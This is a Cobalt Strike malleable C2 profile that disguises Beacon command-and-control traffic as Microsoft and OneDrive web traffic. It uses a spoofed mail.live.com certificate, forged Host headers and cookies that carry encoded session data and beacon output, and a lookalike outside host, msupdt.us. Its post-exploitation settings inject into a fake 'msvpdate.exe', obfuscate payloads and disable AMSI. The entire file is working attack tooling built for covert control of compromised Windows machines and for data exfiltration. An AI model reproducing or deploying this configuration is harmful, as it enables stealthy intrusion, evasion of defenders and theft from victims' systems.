
#set https cert info
https-certificate {
    set CN       "mail.live.com"; #Common Name
    set O        "Microsoft Corporation"; #Organization Name
    set C        "US"; #Country
    set L        "Redmond"; #Locality
    set OU       "Outlook EdgeBrowser2021"; #Organizational Unit Name
    set ST       "Washington"; #State or Province
    set validity "365"; #Number of days the cert is valid for
}

#default Beacon sleep duration and jitter
set sleeptime "65000";
set jitter    "25";

set host_stage "true";

#default useragent for HTTP comms
set useragent "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko";

#IP address used to indicate no tasks are available to DNS Beacon
set dns_idle "8.8.4.4";

#Force a sleep prior to each individual DNS request. (in milliseconds)
set dns_sleep "0";

#Maximum length of hostname when uploading data over DNS (0-255)
set maxdns    "235";

http-get {

    set uri "/unload";

    client {
        parameter "lordlyGod" "muj";
        header "Host" "update.microsoft.com";
        header "Accept" "text/html,application/xml;*/*;";
        header "Accept-Encoding" "gzip, deflate";

        #session metadata
        metadata {
            base64url;
            prepend "G=O:";
            append "=:QeN6Jcj";
            header "Cookie";
        }                    

        #header "MicrosoftApplicationsTelemetryDeviceId" "Fwre&6trgJ788yawJHHsja-Y7uT-9itu-hrfH-7yufNbGv7j0";

    }


    server {

        header "Cache-Control" "no-cache, no-store";
        header "Pragma" "no-cache";
        header "Content-Type" "text/html; charset=utf-8";
        header "Expires" "-1";
        header "Vary" "Accept-Encoding";
        header "Server" "Microsoft-IIS/8.5";
        header "Set-Cookie" "E=P:Wus/PoiNgs=:AjdiuhiBdygyfgyfE98/SnHGBuuy89iMyg+tfhjHdh6=:F; domain=.microsoft.com; path=/";

        #Beacon's tasks
        output {
            netbios;
            prepend " <html xmlns=\"http://www.w3.org/1999/xhtml\"><head><title>Preload</title><script type=\"text/javascript\">var $Config={\"BSI\":{\"enabled\":1,\"xid\":\"b006d80d-6673-4a54-92d1-8d13cdc93b14\",\"pn\":\"ResourcesPreload.default.F.A\",\"rid\":\"007ebd45c9f\",\"biciPrevious\":\"b006d80d-6673-4a54-92d1-8d13cdc93b14_007ebd45c9f_15347\",\"BICI\":{\"fid\":\"ebd4\",\"urlHash\":\"vazo6\",\"beaconUrl\":\"\u002f\u002fc.live.com\u002fc.gif\u003fDI\u003d15347\u0026wlxid\u003db006d80d-6673-4a54-92d1-8d13cdc93b14\u0026reqid\u003d007ebd45c9f\",\"enableLD\":1,\"enableGlinkExtra\":1,\"enableGlinkCall\":1,\"suppressBrowserRightClickMenu\":1},\"SBSPLT\":{\"rt\":\"636191157915732690\"},\"CSIPerf\":{\"enabled\":1,\"page\":{\"landingPageName\":\"\",\"timeStamp\":\"\"},\"IDSS\":{\"enabled\":1},\"WLXFD\":{\"enabled\":1},\"Trace\":{\"enabled\":1}},\"Scenario\":{\"handlerPath\":\"\u002fHandlers\u002fScenarioQos.mvc\",\"enabled\":1},\"Watson\":{\"fbody\":1,\"enabled\":1,\"sr\":100}},\"build\":\"17.502.2414\",\"mkt\":\"en-US\",\"mmn\":\"BN1301xxPFE021\",\"di\":15347,\"prop\":\"SDX.Skydrive\",\"sd\":\".live.com\",\"hn\":\"onedrive.live.com\",\"isSecure\":1,\"Preload\":{\"Resources\":[\"https\u003a\u002f\u002fspoprod-a.akamaihd.net\u002ffiles\u002fonedrive-website-release-prod_master_20160928.003\u002fjquery-1.7.2-39eeb07e.js\",\"https\u003a\u002f\u002fspoprod-a.akamaihd.net\u002ffiles\u002fonedrive-website-release-prod_master_20160928.003\u002fwac0-c2bada28.js\",\"https\u003a\u002f\u002fspoprod-a.akamaihd.net\u002ffiles\u002fonedrive-website-release-prod_master_20160928.003\u002fwac1-94024fff.js\",\"https\u003a\u002f\u002fspoprod-a.akamaihd.net\u002ffiles\u002fonedrive-website-release-prod_master_20160928.003\u002fwac2-01ac784f.js\",\"https\u003a\u002f\u002fspoprod-a.akamaihd.net\u002ffiles\u002fonedrive-website-release-prod_master_20160928.003\u002fwac_s_test-aec201a8.js\",\"https\u003a\u002f\u002fspoprod-a.akamaihd.net\u002ffiles\"";
            append "u002ffiles\u002fonedrive-website-release-prod_master_20160928.003\u002fwac_s_unknownscenario-258417ad.js\",\"https\u003a\u002f\u002fs1-word-view-15.cdn.office.net\u003a443\u002fwv\u002fs\u002f1677265950_resources\u002f1033\u002fprogress16.gif\",\"https\u003a\u002f\u002fs1-word-view-15.cdn.office.net\u003a443\u002fwv\u002fs\u002f1677265950_App_Scripts\u002f1033\u002fWordViewerIntl.js\",\"https\u003a\u002f\u002fs1-word-view-15.cdn.office.net\u003a443\u002fwv\u002fs\u002f1677265950_resources\u002f1033\u002fWordViewer.css\",\"https\u003a\u002f\u002fs1-word-view-15.cdn.office.net\u003a443\u002fwv\u002fs\u002f1677265950_resources\u002f1033\u002fwv.png\",\"https\u003a\u002f\u002fs1-word-view-15.cdn.office.net\u003a443\u002fwv\u002fs\u002f1677265950_App_Scripts\u002fWordViewer.js\",\"https\u003a\u002f\u002fs1-officeapps-15.cdn.office.net\u003a443\u002fwv\u002fs\u002f1677265950_App_Scripts\u002f1033\u002fCommonIntl.js\"";
            print;
        }
    }
}

http-post {
    
    set uri "/msupdatestatus";
    set verb "GET";

    client {

        header "Host" "microsoft.com";
        header "Accept" "text/html,application/xml;*/*;";
        header "Accept-Encoding" "gzip, deflate";

        #Beacon's responses
        output {
            base64url;
            prepend "O=G:";
            append "=:AHjeY";
            header "Cookie";
        }

        #session ID
        id {
            base64url;
            prepend "https://cd.msupdt.us/mspd.html?s=";
            header "Referer";
        }

    }

    server {

        header "Cache-Control" "no-cache, no-store";
        header "Pragma" "no-cache";
        header "Content-Type" "text/html; charset=utf-8";
        header "Expires" "-1";
        header "Vary" "Accept-Encoding";
        header "Server" "Microsoft-IIS/8.5";
        header "Set-Cookie" "O=G:We/40ofu84h=:AhsYushwjdj873hsgshqwu/ZDZuMnyxXC+BkkNivU=:F; domain=.microsoft.com; path=/";

        #empty
        output {
            print;
        }
    }
}

#change the stager server
http-stager {
    server {
        header "Content-Type" "text/html; charset=utf-8";
    }
}


post-ex {
	set spawnto_x86 "%windir%\\syswow64\\msvpdate.exe";
	set spawnto_x64 "%windir%\\sysnative\\msvpdate.exe";
	set obfuscate "true";
	set smartinject "true";
	set amsi_disable "true";
}
